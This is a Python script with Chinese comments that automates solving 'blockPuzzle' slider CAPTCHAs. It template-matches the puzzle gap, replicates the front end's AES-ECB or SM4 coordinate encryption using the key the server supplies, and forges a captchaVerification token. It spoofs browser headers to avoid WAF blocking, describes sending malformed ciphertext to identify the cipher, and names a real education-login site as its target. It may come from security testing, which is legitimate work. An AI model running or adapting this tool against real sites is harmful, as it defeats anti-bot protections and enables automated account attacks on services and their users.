# -*- coding: utf-8 -*-
"""滑块验证码程序化解题器（通用版，沉淀自 qdedu 实战，对应 xs-auth 线索 S9/S10）

适用前提（S9）：
  - 验证码为拼图滑块（blockPuzzle），背景图与拼图块以 base64 随验证码响应下发
  - 坐标由前端加密提交且算法可复刻：ECB 模式无 IV/链式依赖，密钥随响应下发（secretKey）
  - 校验接口接受 pointJson + token，通过后返回 captchaVerification 供业务接口使用

通用流程：取码 -> 模板匹配求缺口 x -> 复刻加密提交 pointJson -> 生成 captchaVerification

关键经验：
  1) 算法识别：国内目标常见 CryptoJS 封装，疑似 SM4 时先验证——CryptoJS AES 的 Rcon 表
     [0,1,2,4,8,16,32,64,128,27,54] 可区分；或按 S10 提交畸形密文触发
     "Input length must be multiple of 16" / "not properly padded" 报错确认算法族与模式
  2) 模板匹配 y 偏移：滑动区域必须用拼图块自身的 y 区间（bg[p_min_y:p_min_y+ph, ...]），
     用 y=0 会导致误匹配
  3) 单次消费：多数实现验证码单次使用（重放被拒、失败即消耗），每次业务请求需重新取码解题

用法：
  python slider_captcha_solver.py --base https://target.com
      [--captcha-path /api/captcha] [--check-path /api/captcha/check]
      [--y 5] [--captcha-type blockPuzzle] [--algo aes]

依赖：pip install pycryptodome numpy pillow （--algo sm4 需额外安装 gmssl）
"""
import argparse
import base64
import io
import json
import urllib.request

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    raise SystemExit("缺少依赖: pip install pycryptodome numpy pillow")


def http_json(base: str, url: str, data=None, headers=None, method=None):
    """通用 JSON 请求（带浏览器头，规避 WAF 按默认 UA 拦截）"""
    req_headers = {
        "Authorization": "no-auth",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Origin": base,
        "Referer": base + "/",
        "X-Requested-With": "XMLHttpRequest",
    }
    if headers:
        req_headers.update(headers)
    body = json.dumps(data).encode() if data is not None else None
    m = method or ("POST" if data is not None else "GET")
    req = urllib.request.Request(url, data=body, headers=req_headers, method=m)
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read().decode())


def aes_ecb_encrypt_b64(plaintext: str, key: str) -> str:
    """复刻 CryptoJS AES-128-ECB + PKCS7（qdedu 实战确认；算法识别见 docstring 经验 1）"""
    cipher = AES.new(key.encode("utf-8"), AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode("utf-8"), 16))).decode()


def find_notch_x(orig_b64: str, jigsaw_b64: str) -> int:
    """模板匹配：用拼图块 alpha 蒙版在背景图中滑动求缺口 x（注意 y 偏移，见 docstring 经验 2）"""
    import numpy as np
    from PIL import Image

    orig = Image.open(io.BytesIO(base64.b64decode(orig_b64))).convert("RGB")
    jig = Image.open(io.BytesIO(base64.b64decode(jigsaw_b64))).convert("RGBA")
    bg = np.asarray(orig, dtype=np.int16)
    piece = np.asarray(jig, dtype=np.int16)
    alpha = piece[:, :, 3]
    # 取拼图块非透明区域（阈值略低于 255 以包容边缘抗锯齿）
    mask = alpha > 100
    py, px = np.where(mask)
    pw, ph = px.max() - px.min() + 1, py.max() - py.min() + 1
    p_min_x, p_min_y = px.min(), py.min()
    patch = piece[p_min_y:p_min_y + ph, p_min_x:p_min_x + pw, :3]
    m = mask[p_min_y:p_min_y + ph, p_min_x:p_min_x + pw]
    best_x, best_score = 0, -1e18
    W = bg.shape[1]
    for x0 in range(0, W - pw):
        region = bg[p_min_y:p_min_y + ph, x0:x0 + pw]
        diff = np.abs(region - patch)
        score = -np.sum(diff[m]) / max(np.sum(m), 1)
        if score > best_score:
            best_score = score
            best_x = x0
    return best_x


def main():
    ap = argparse.ArgumentParser(description="滑块验证码程序化解题器 (xs-auth S9)")
    ap.add_argument("--base", required=True, help="目标站点根 URL，如 https://jsjypassport.qdedu.net")
    ap.add_argument("--captcha-path", default="/api/captcha", help="取码接口路径")
    ap.add_argument("--check-path", default="/api/captcha/check", help="校验接口路径")
    ap.add_argument("--y", type=int, default=5, help="缺口 y 坐标（目标默认值，qdedu=5）")
    ap.add_argument("--captcha-type", default="blockPuzzle", help="验证码类型标识")
    ap.add_argument("--algo", choices=["aes", "sm4"], default="aes",
                    help="坐标加密算法（默认 aes；sm4 需装 gmssl，且先用 S10 法确认前端确实是 SM4 而非 AES）")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    cap = http_json(base, base + args.captcha_path, {})["data"]
    token, secret_key = cap["token"], cap["secretKey"]
    print(f"[*] token={token} secretKey={secret_key}")

    x = find_notch_x(cap["originalImageBase64"], cap["jigsawImageBase64"])
    print(f"[*] 缺口x坐标(图像像素): {x}")
    point = {"x": int(x), "y": args.y}
    point_json = json.dumps(point, separators=(",", ":"))

    if args.algo == "aes":
        enc_point = aes_ecb_encrypt_b64(point_json, secret_key)
        cv = aes_ecb_encrypt_b64(f"{token}---{point_json}", secret_key)
    else:
        from gmssl import sm4  # 注意: gmssl crypt_ecb 自动 PKCS7 填充，勿再手动 pad
        s = sm4.CryptSM4()
        s.set_key(secret_key.encode(), sm4.SM4_ENCRYPT)
        enc_point = base64.b64encode(s.crypt_ecb(point_json.encode())).decode()
        cv = base64.b64encode(s.crypt_ecb(f"{token}---{point_json}".encode())).decode()

    check_resp = http_json(base, base + args.check_path, {
        "captchaType": args.captcha_type,
        "pointJson": enc_point,
        "token": token,
    })
    print(f"[*] captcha/check: {json.dumps(check_resp, ensure_ascii=False)[:300]}")
    print(f"[*] captchaVerification: {cv}")
    return token, cv, x


if __name__ == "__main__":
    main()
